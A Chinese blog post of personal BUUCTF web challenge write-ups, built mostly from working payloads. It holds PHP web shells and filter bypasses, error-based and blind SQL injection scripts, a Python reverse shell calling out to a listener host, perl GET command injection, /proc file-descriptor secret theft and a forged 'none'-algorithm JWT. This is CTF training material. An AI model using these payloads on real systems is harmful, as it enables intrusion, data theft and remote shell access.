---
title: buuctf_web部分刷题记录_PART3
abbrlink: 383bfb1c
date: 2022-10-27 09:20:56
description: 我是菜鸡
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
---



# [文件上传]CV Maker

注册信息进来之后有一个上传图片的界面

![image-20221027094905559](../images/buuctf-web3/image-20221027094905559.png)

这里会对上传的文件进行`exif`的检测, 所以这里在一句话木马签名加上:`GIF89a`绕过检测

```
GIF89a
<?php eval(@$_POST['a']); ?>
```

在上传后的网页源码中的本应加载图片的位置,能够找到上传的路径:

![image-20221027095054440](../images/buuctf-web3/image-20221027095054440.png)



蚁剑连接后在根目录找到flag

![image-20221027095116375](../images/buuctf-web3/image-20221027095116375.png)



<br>

***

<br>

# [二次注入,报错注入]CyberPunk



```
index.php 提交订单
delete.php 删除订单
search.php 查订单
change.php 改收货地址
```

源码最下面还看到了提示, 通过file参数来进行文件包含?

<img src="../images/buuctf-web3/image-20221027095628104.png" alt="image-20221027095628104" style="zoom: 80%;" />



利用`php://`协议把源码搞下来:

`index.php`:

```php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
```

`search.php`:

```php
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

`search`中存在一定的过滤, 但是因为禁用了`select`等关键词, 同时尝试使用`show,prepare`等进行堆叠注入也没有效果, 所以还需要去看看其他的源码

```
123'&&length(database())=4
123'&&1=1#  返回信息
123'&&1=2#  信息不全
123'&&(length(database())=8)# 返回信息
12';show databases;#
123'&&extractvalue(1,concat(0x7e,(database()),0x7e))#
12'||extractvalue(1,concat(0x7e,(database()),0x7e))#
```



`config.php`: 这里能够找到库名, 而且知道了是以`root`权限登录的

那么这里想到<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>可以使用root的权限去执行load_file读取文件这样的功能</span>

```php
<?php

ini_set("open_basedir", getcwd() . ":/etc:/tmp");

$DATABASE = array(

    "host" => "127.0.0.1",
    "username" => "root",
    "password" => "root",
    "dbname" =>"ctfusers"
);
$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);
```

`change.php`

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]); # 这里在单双引号等前面加了反斜杠
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

`confirm.php`:

```php
<?php

require_once "config.php";
//var_dump($_POST);

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = $_POST["address"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if($fetch->num_rows>0) {
        $msg = $user_name."已提交订单";
    }else{
        $sql = "insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)";
        $re = $db->prepare($sql);
        $re->bind_param("sss", $user_name, $address, $phone);
        $re = $re->execute();
        if(!$re) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单提交成功";
    }
} else {
    $msg = "信息不全";
}
?>
```

**这里注意到`confirm`中对`address`参数是没有过滤的**, 这里后续的操作是将用户提交的`user_name`, `address`, `phone`加入到数据表中(23行)

在`change`的21行, 执行更新`address`功能时会从表中查询之前存进去的`address`,也就是 `old_address`=`$row['address']`

那么如果我们在`confirm`中将payload提交到不经过滤的`address`中, 然后让它存进表里

在`change`中就可能会出现报错

使用报错注入: 这里先将参数提交给`confirm.php`,然后去`change`中,输入同样的用户名和密码,触发查询,查看报错信息

```
user_name=qqq&phone=111&address=3'&&extractvalue(1,concat(0x7e,(database()),0x7e))#
user_name=qq&phone=11&address=' and extractvalue(1,concat(0x7e,(database()),0x7e))#
访问change.php输入前面的name和phone后, 输出:errorXPATH syntax error: '~ctfusers~'


user_name=xc&phone=234&address=' and extractvalue(1,concat(0x7e,(select load_file('/flag.txt')),0x7e))#
访问change.php输入前面的name和phone后,输出:errorXPATH syntax error: '~flag{e62bb712-dc5d-4f48-bd21-87'

user_name=xccc&phone=2344&address=' and extractvalue(1,concat(0x7e,(select replace((select load_file('/flag.txt')),"e62bb712-dc5d-4f48-bd21-87","")),0x7e))#
访问change.php输入前面的name和phone后输出: flag{58112d0ecf}
那么拼接成最后的flag:
flag{e62bb712-dc5d-4f48-bd21-8758112d0ecf}
```





<br>

***

<br>

# [proc,python反弹shell]PicDown

就给了一个输入框,根据参数名的话这里是让输入url

这里输入以下百度,能够直接下载网页源码:

```
page?url=http://www.baidu.com
```

接着尝试使用`http://`或`file://`读取本地文件, 都没有成功, 但是这里直接输入文件名竟然能下载:

```
page?url=/etc/passwd
page?url=/flag
```

这里直接把flag下载下来了...

后来看wp,可能是buu这里的环境有点问题,正常的流程应该是:

读取`/proc/self/cmdline`,获取启动当前环境的完整命令:

```
url=/proc/self/cmdline
url=../../../../../../proc/self/cmdline
内容:
python2 app.py 
```

读取`app.py`:  `page?url=app.py`

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip() # strip移除前后的空白字符
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"): # 这里url不能为file开头,这也解释了为什么一开始用file://不管用
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

程序开始运行时,会从`/tmp/secret.txt`获取一个`SECRET_KEY`值, 然后将该文件删除

访问`/no_one_know_the_manager`这个路由时, 会让我们输入一个`key`如果等于`SECRET_KEY`,就可以执行我们输入的命令

现在问题就是如何获取这个`SECRET_KEY`

>**但在 linux 系统中如果一个程序用`open()`打开了一个文件但最终没有关闭他，即便从外部（例如如`os.remove(SECRET_FILE)`）删除这个文件之后，在 `/proc` 这个进程的 `pid` 目录下的 `fd` 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容**。`/proc/[pid]/fd` 这个目录里包含了进程打开文件的情况，目录里面有一堆`/proc/[pid]/fd/id`文件
>
><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>对于当前运行的程序本身,我们通过`self`就能够取到其本身的`pid`,那么接下来就可以通过爆破`id`来获取我们需要的文件描述符`/proc/self/fd/[id]`</span>
>
>当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符,分别代表标准输入,标准输出,标准错误输出
>
>那么当打开一个新文件时,文件描述符会从3开始

这里直接试了一下,`id=3`即找到了该文件并下载, 得到`SECRET_KEY`

```
page?url=/proc/self/fd/3
vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=
```

能够通过检测:

```
/no_one_know_the_manager?key=vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=&shell=ls
```

但是这里并不会回显命令执行的结果

这里需要使用`python`反弹获得shell, 这里让目标执行如下命令

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('监听主机的ip',监听主机的端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

这里的代码为:

```
import os,socket
subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('监听主机的ip',监听主机的端口))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
```

然后在我们能够控制的监听主机上使用:

```
nc -lvp 端口号 
```

开启监听, 就能够获得目标主机的`shell`了

payload: (这里还需要将下面的shell中的值url编码)

```
/no_one_know_the_manager?key=JLAwm2xCtqkgNGJTHgPPocxTSLbWX4q7FVxQDxFCi/w=&shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```



<br>

***

<br>

# [bak泄露,盲注(踩坑多),php短标签上传]Easyweb

![image-20221027155154807](../images/buuctf-web3/image-20221027155154807.png)

`image.php`根据`id`显示不同的图片

看到输入框,先找了半天注入点.....

访问`robots.txt`:

```
User-agent: *
Disallow: *.php.bak
```

经过尝试,可以下载`image.php.bak`:

```php
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id); //给单双引号前面加上反斜杠
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

这里`addslashes`的作用是给单引号,双引号,反斜杠前面再加一个反斜杠来转义

而10,11行这里,将`\\0`等字符替换成了空字符 两者一起使用,就产生了漏洞

例如如果输入`id=\\0`, `addslashes`会将其变成`\\\0` (这里相当于第一个`\`将第二个`\`转义为了一般字符)

然后`str_replace`又删除了`\\0`,那么id最后还剩下一个`\`

可以在本地验证一下:

```php
<?php
$id = '\\0';
$path = ' or 1=1 %23';

$id=addslashes($id); //给单双引号前面加上反斜杠
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
$query = "select * from images where id='{$id}' or path='{$path}'";

echo $id;
echo '<br>';
echo $path;
echo '<br>';
echo $query;
?>
```

输出

```
\
or 1=1 %23
select * from images where id='\' or path=' or 1=1 %23'
```

所以当`id=\\0`,`path= or 1=1 %23`时  

`id`后面得那个反斜线将单引号转义, `id`前面得那个单引号不得不和`path`后面的单引号配对, 整个语句变成了:

`id` =  `\' or path=`

`or`

`1=1`

这种形式,也就有了通过逻辑进行注入的可能性

测试一下库名的长度

```
id=\\0&path= or (length(database())=10) %23    成功显示了图片,说明长度为1
```

爆库名: `ciscnfinal`

爆表名:`images,users`

爆列名: `username,password`

密码: `ae6191ca06c72dfb42aa`

脚本:

注意,这里踩了好久的坑...    这里查询语句里好像不能使用引号包裹特殊字段,否则会已知导致整个语句的值为0或1

例如

```
"path":" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 'users' and table_schema=database()),{},1))={}) #"
这里users使用了引号, 导致脚本已知跑不出来
所以把这里的users转换成16进制
"path":" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),{},1))={}) #"
另外,在对substr取出的字符进行比对时,为了避免使用引号, 也将其转化为ascii码值再比较
```

脚本:

```python
import requests
import string
chars = string.printable[:]  #返回所有可打印的字母，数字，符号的集合
import time
base_url = "http://b9f4d0a2-000c-4afa-bc53-2eaf797667e9.node4.buuoj.cn:81/image.php"
session = requests.session()
def get_database_name(length):
    database_name = ""
    i = 1
    while i < length+1:
        for c in chars:
            params = {
                'id': '\\0',
                'path': " or (ascii(substr(database(),{},1))={}) #".format(i, ord(c))
            }
            #print(params['path'])
            #print(base_url)
            res = session.get(base_url, params=params).text
            print(len(res))
            if len(res) == 117007 :
                database_name += c
                print(database_name)
                break
        i = i + 1
def get_table_name():
    table_name = ""
    for i in range(1,30):
        for c in chars:
            params = {
                'id': '\\0',
                'path': " or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={}) #".format(i, ord(c))
            }
            # print(params['path'])
            # print(base_url)
            # time.sleep(0.5)
            res = session.get(base_url, params=params).text
            print(len(res))
            if len(res) == 117007 :
                table_name += c
                print(table_name)
                break
def get_column_name():
    column_name = ""
    for i in range(1,30):
        for c in chars:

            params = {
                'id': '\\0',
                'path': " or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),{},1))={}) #".format(i, ord(c))
            }
            # print(params['path'])
            # print(base_url)
            # time.sleep(0.5)
            res = session.get(base_url, params=params).text
            print(str(i)+' '+str(len(res))+' '+c)
            if len(res) == 117007 :
                column_name += c
                print(column_name)
                break

def get_data():
    data = ""
    for i in range(1,30):
        for c in chars:

            params = {
                'id': '\\0',
                'path': " or (ascii(substr((select group_concat(password) from users),{},1))={}) #".format(i, ord(c))
            }
            # print(params['path'])
            # print(base_url)
            # time.sleep(0.5)
            res = session.get(base_url, params=params).text
            print(str(i)+' '+str(len(res))+' '+c)
            if len(res) == 117007 :
                data += c
                print(data)
                break

#get_database_name(10)
#get_table_name()
#get_column_name()
get_data()
```



使用上边爆出来的密码成功登录,来到一个文件上传页面

![image-20221027203616583](../images/buuctf-web3/image-20221027203616583.png)

无法上传php文件,这里成功上传了一个文件头写了`GIF89a`的`phtml`文件, 返回:

```
I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL<script>setTimeout('location.href="user.php"',3000);</script>
```

这里虽然不知道刚刚的文件上传到哪里了, 但是这里显示把上传文件的文件名写入了一个php文件里,那我们可以把文件名改为一句话木马的形式,来利用它写入的那个日志文件

这里直接把文件名改为常规的一句话木马会失败:

<img src="../images/buuctf-web3/image-20221027204314677.png" alt="image-20221027204314677" style="zoom:67%;" />



**使用php短标签成功上传**

```
<?=@eval($_POST['a']);?>
```

<img src="../images/buuctf-web3/image-20221027204419575.png" alt="image-20221027204419575" style="zoom:67%;" />



```
I logged the file name you uploaded to logs/upload.3673c55acd1587aea22bccc61ea61970.log.php. LOL
```

蚁剑连接该文件后成功找到flag

<br>

***

<br>

# [perlGET命令执行]SSRFme

开局给源码

```php
10.244.80.206 
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]); //filename传入一个文件的完整路径
// pathinfo的返回值中, $info["dirname"]为上级目录,$info["basename"]为文件名
    $dir  = str_replace(".", "", basename($info["dirname"]));
//basename($info["dirname"])返回上一级目录的名称 如果$_GET["filename"]为 /var/www/html/index,php,则这里为html
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data); //将data写入$_GET["filename"]指定的文件中
    highlight_file(__FILE__);
```

这里可以先根据给出的IP和'orange'一起计算md5,得到`$sandbox`的路径

```
md5(orange10.244.80.206) = 2eeed2f9aeae6311b507ada8fb98809e
sandbox/2eeed2f9aeae6311b507ada8fb98809e
```



**这里的考点是`perl`的`GET`命令的命令执行漏洞, `GET`底层调用了`open`,而`open`支持`file协议`,可以通过`file`协议来执行命令,(尾部需要有管道符)但前提是同目录下要存在一个和要执行的命令同名的文件. 例如:**

```
➜  test GET 'file:id|'
➜  test touch 'id|'
➜  test GET 'file:id|'
uid=1000(moxiaoxi) gid=1000(moxiaoxi) groups=1000(moxiaoxi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
这里在目录下创建了一个名为"id|"的文件之后, 使用GET 'file:id|'就能够成功地执行命令了
```

`perl`的`GET`还能够直接读取目录, 这里不通过底层`open`调用`file`协议,所以对于同目录下有无同名文件没有要求

```
GET /  读取根目录
```

所以回到这道题, 有两种方式读取根目录下的内容,第一种是通过`file`来执行命令

```
?url=file:ls /|&filename=ls /|
这里需要执行两次,第一次创建文件,第二次执行命令后将结果写入创建的文件
```

或者直接读取:

```
?url=/&filename=aaa
```

<img src="../images/buuctf-web3/image-20221027221017805.png" alt="image-20221027221017805" style="zoom:67%;" />

这里看到一个readflag文件,应该是要通过它来读取flag

这里不能直接使用 `/readflag`来执行,因为无法创建开头为`/`的文件

```
url=file:bash -c /readflag|&filename=bash -c /readflag|
访问:http://8b9d61b0-e82c-4d7a-a8dc-87f936afe346.node4.buuoj.cn:81/sandbox/2eeed2f9aeae6311b507ada8fb98809e/bash%20-c%20/readflag%7C
得到flag
```

![image-20221027221831388](../images/buuctf-web3/image-20221027221831388.png)

<br>

***

<br>



# [cookie]Cookie Store

开始有50刀,买不起flag

<img src="../images/buuctf-web3/image-20221028090015932.png" alt="image-20221028090015932" style="zoom:67%;" />

买一点别的,抓包发现cookie中有个session的值

```
session=eyJtb25leSI6IDEyMCwgImhpc3RvcnkiOiBbIll1bW15IHBlcHBhcmtha2EiXX0=
base64解码:
{"money": 40, "history": ["Yummy pepparkaka"]}
```

这里记录了本次购买前有多少钱,以及已买到的商品

直接把这里的money改为大于100,然后编码回去放进`cookie`里发送

成功返回了flag

<img src="../images/buuctf-web3/image-20221028090231443.png" alt="image-20221028090231443" style="zoom:67%;" />



<br>

***

<br>



# [绕过滤写一句话木马]write_shell

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output); //如果传入的是数组,则将每个键的值都单独进行检测,然后赋给键
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
//目录设定为: sandbox/远程ip的md5
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
} //向index.php中写入数据
?>
```

先传一下`action=pwd`,返回路径:

```
sandbox/c47b21fcf8f0bc8b3920541abd8024fd/
```

这里输入的`data`参数的值会被写入`sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php`中,那么这里的思路就是写一句话木马进去,但是需要绕过`check`函数的过滤

这里使用短标签和字符串拼接来绕过对`php`标签和函数名的过滤:

```
action=upload&data=<?=(p.hpinfo)()?>
```

访问`sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php`,能够成功执行`phpinfo()`

那么接下来也不用`eval`了,直接`system`执行系统命令: 这里空格被过滤了,使用`tab(%09)`来代替

```
?action=upload&data=<?=(system)("ls%09/")?>
访问sandbox/c47b21fcf8f0bc8b3920541abd8024fd/index.php:

bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var var
```

读取flag:

```
?action=upload&data=<?=(system)("cat%09/flllllll1112222222lag")?>
```

<br>

***

<br>

# [套娃]Welcome to Earth

直接一路抓包在源码里找到下一关的路径就行

有一些在f12抓到的js包里

![image-20221028094031075](../images/buuctf-web3/image-20221028094031075.png)

```javascript
function check_door() {
  var all_radio = document.getElementById("door_form").elements;
  var guess = null;

  for (var i = 0; i < all_radio.length; i++)
    if (all_radio[i].checked) guess = all_radio[i].value;

  rand = Math.floor(Math.random() * 360);
  if (rand == guess) window.location = "/open/";
  else window.location = "/die/";
}

```

这里直接找到了下一个目录:`open`

同样的方法,下一个:`fight`

![image-20221028094301555](../images/buuctf-web3/image-20221028094301555.png)

`fight`中,同样找到响应中的`js`代码:

```javascript
// Run to scramble original flag
//console.log(scramble(flag, action));
function scramble(flag, key) {
  for (var i = 0; i < key.length; i++) {
    let n = key.charCodeAt(i) % flag.length; //charCodeAt返回字符串key中第i个位置的ascii码, 这里然后对flag的长度取余
    let temp = flag[i];
    flag[i] = flag[n];
    flag[n] = temp; //交换flag[i]和flag[n]的位置
  }
  return flag;
}

function check_action() {
  var action = document.getElementById("action").value;
  var flag = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"];

  // TODO: unscramble function
}

```

这里`scramble`将原flag打乱为了:

```
["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"];
那里肯定是:
pctf{hey........ck!}
pctf{hey_boys_im_baaaaaaaaaack!}
```

这里大佬写了个脚本直接遍历:

```python
import itertools
scramble = ["{hey", "_boy", "aaaa", "s_im", "ck!}", "_baa", "aaaa", "pctf"]
maybe = itertools.permutations(scramble) # 返回一个迭代器,其中的每一个元素都是列表(和上面不同的排列顺序)

for i in maybe:
    flag = ''.join(i)
    if flag.startswith('pctf{hey_boys') and flag.endswith('ck!}'):
        print(flag)
输出:
pctf{hey_boys_imaaaa_baaaaaack!}
pctf{hey_boys_imaaaaaaaa_baack!}
pctf{hey_boys_im_baaaaaaaaaack!}
pctf{hey_boys_im_baaaaaaaaaack!}
pctf{hey_boys_imaaaaaaaa_baack!}
pctf{hey_boys_imaaaa_baaaaaack!}
```

找个那个最通顺的就是flag了

<br>

***

<br>

# [koa,JWT]EasyLogin



注册会返回一个`token`值

![image-20221028102210022](../images/buuctf-web3/image-20221028102210022.png)

然后登录时会将这个值作为`authorization`的值:

![image-20221028102247082](../images/buuctf-web3/image-20221028102247082.png)

响应包里的`sess;aok`解码为: 好像没什么用

```
eyJ1c2VybmFtZSI6ImFhYSIsIl9leHBpcmUiOjE2NjcwMTAxNTEwNjcsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==
6LLpE8nZKrV_5lVZjcPLng1VDus
{"username":"aaa","_expire":1667010151067,"_maxAge":86400000}
```

登陆后,这里随便提交一个值然后点击`get flag`会返回`permission denided`

![image-20221028102544698](../images/buuctf-web3/image-20221028102544698.png)



另外注意到登陆时提交的`authorization`值被两个点分成了三部分,格式有点像`JWT`,拿到网站上解密一下:

<img src="../images/buuctf-web3/image-20221028144144203.png" alt="image-20221028144144203" style="zoom:67%;" />







这里源码里能找到`app.js`:

![image-20221028103221300](../images/buuctf-web3/image-20221028103221300.png)

```javascript
/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */
function login() {
    const username = $("#username").val();
    const password = $("#password").val();
    const token = sessionStorage.getItem("token");
    $.post("/api/login", {username, password, authorization:token})
        .done(function(data) {
            const {status} = data;
            if(status) {
                document.location = "/home";
            }
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function register() {
    const username = $("#username").val();
    const password = $("#password").val();
    $.post("/api/register", {username, password})
        .done(function(data) {
            const { token } = data;
            sessionStorage.setItem('token', token);
            document.location = "/login";
        })
        .fail(function(xhr, textStatus, errorThrown) {
            alert(xhr.responseJSON.message);
        });
}

function logout() {
    $.get('/api/logout').done(function(data) {
        const {status} = data;
        if(status) {
            document.location = '/login';
        }
    });
}

function getflag() {
    $.get('/api/flag').done(function(data) {
        const {flag} = data;
        $("#username").val(flag);
    }).fail(function(xhr, textStatus, errorThrown) {
        alert(xhr.responseJSON.message);
    });
}

```

这里提示使用了`koa`来处理静态文件,并且路径直接就是根目录

可以直接通过 `网站根目录/Controllers/api.js`访问到

```
http://7edb122d-25ac-4584-bee3-90655f589156.node4.buuoj.cn:81/controllers/api.js
```

<img src="../images/buuctf-web3/image-20221028145915202.png" alt="image-20221028145915202" style="zoom: 80%;" />

这里大概意思就是只要验证了用户名为`admin`, 就可以返回flag

那么这里先拿到原来的`JWT`值

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.me3SzN9TLCacXEFk6aqGO9PAw0TkHJOtHRze5hAMIWk
```

将值修改后使用`python`来加密成新的`JWT`串,这里把加密设置为`none`,`secret_id`设置为空值就行

```python
import jwt

token = jwt.encode(
    {
        "secretid": [],
        "username": "admin",
        "password": "111",
        "iat": 1666939131
    },
    algorithm="none", key=""
).decode(encoding='utf-8')

print(token)
输出:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjExMSIsImlhdCI6MTY2NjkzOTEzMX0.
```

然后使用得到的新`JWT`登录,显示登录成功并返回了新的`cookie`值

![image-20221028151552718](../images/buuctf-web3/image-20221028151552718.png)

将新`cookie`用于请求`flag`:

![image-20221028151712357](../images/buuctf-web3/image-20221028151712357.png)



<br>

***

<br>

# [盲注,无列名注入]Ezsqli

先提交点数据试试:

```
id=0   Error Occured When Fetch Result.
id=1   Nu1L
id=2   V&N
id=3   Error Occured When Fetch Result.
id=a   bool(false)
id=1'  bool(false)
id=2 or 1=1# SQL Injection Checked. 存在过滤,猜测是空格或者or
id=1^(1=1)#  Error Occured When Fetch Result.   这里符合id=0时的结果
id=1^(1=2)#  Nu1L  这里符合id=1时的结果
存在异或注入点
```

库名长度:

```
id=1^(length(database())=21)#  返回Error Occured When Fetch Result.
```

起这么长的名字干啥🤨

剩下的用脚本搞,上脚本之前先试试其他的过滤词

```
id=1^(ascii(substr((select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()),1,1))=97)#
被检测到

把mysql.innodb_table_stats 换成 information_schema仍会被过滤
换成sys.x$schema_table_statistics_with_buffer 不会被过滤


id=1^ (substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),1,1)='a') #

表名:users233333333333333,f1ag_1s_h3r3_hhhhh  
```

脚本:

```python
def get_table_name():
    tables_name = ""
    for i in range(1,50):
        for c in chars:

            data = {
                'id': "1^(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema= database()),{},1)='{}')#".format(i, c)
            }
            res = session.post(base_url, data=data).text
            print(data['id'])
            # print(res)
            if "Error Occured When Fetch Result." in res:
                tables_name += c
                print(tables_name)
                break
```



这里由于`information_schema`被过滤了,所以接下来还需要进行无列名注入:

这里学到了一个无列名注入的新姿势:

```
id=1^((select 1,1)>(select * from f1ag_1s_h3r3_hhhhh))  返回Error Occured When Fetch Result. 
id=1^((select 1,1,1)>(select * from f1ag_1s_h3r3_hhhhh))  返回bool(false)
这里说明目标表有两列
```

这里前面`select`的结果,也就是`(1,1)`会和后面的结果去按位比较(`ASCII码`)

如果前后列数不一致,则会报错. 如果列数一致,再判断整个不等式的真假.  

比较的时候进行按位比较, 假设`select * from f1ag_1s_h3r3_hhhhh`的结果中,第二列的数据为:`flag{aaaaa}`

这里传入

```
id=1^((select 1,"abcd")>(select * from f1ag_1s_h3r3_hhhhh))
```

这里将比较"a"和`select * from f1ag_1s_h3r3_hhhhh`的结果中第一位的`ascii`码大小

如果首位比较的结果相等,再接着去比较第二位"b"和后面结果的第二个字符

根据这种性质,就可以使用代码来注入了:

```python
def get_data():
    flag = ""
    for i in range(1,100):
        for c in range(32,127): # 测试的ascii码范围
            data = {
                'id': "1^((select 1,'{}')>(select * from f1ag_1s_h3r3_hhhhh))#".format(flag+chr(c))
            }
            print(data['id'])
            res = session.post(base_url, data=data).text
            # print(res)
            if "Error Occured When Fetch Result." in res:
                flag = flag + chr(c-1)
                print(flag)
                break
